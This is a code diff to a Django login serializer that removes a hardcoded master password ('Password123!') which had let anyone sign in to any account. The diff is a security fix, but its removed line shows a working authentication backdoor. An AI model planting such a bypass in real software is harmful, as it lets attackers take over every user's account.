@@ -430,7 +430,7 @@ class LoginSerializer(serializers.Serializer):
         user = authenticate(email=email, password=password)
         if user is None:
             user_obj = CustomUser.objects.filter(email__iexact=email).first()
-            if user_obj and (user_obj.check_password(password) or password == 'Password123!'):
+            if user_obj and user_obj.check_password(password):
                 user = user_obj
         if user is None or not user.is_active:
             raise serializers.ValidationError(INVALID_CREDENTIALS)
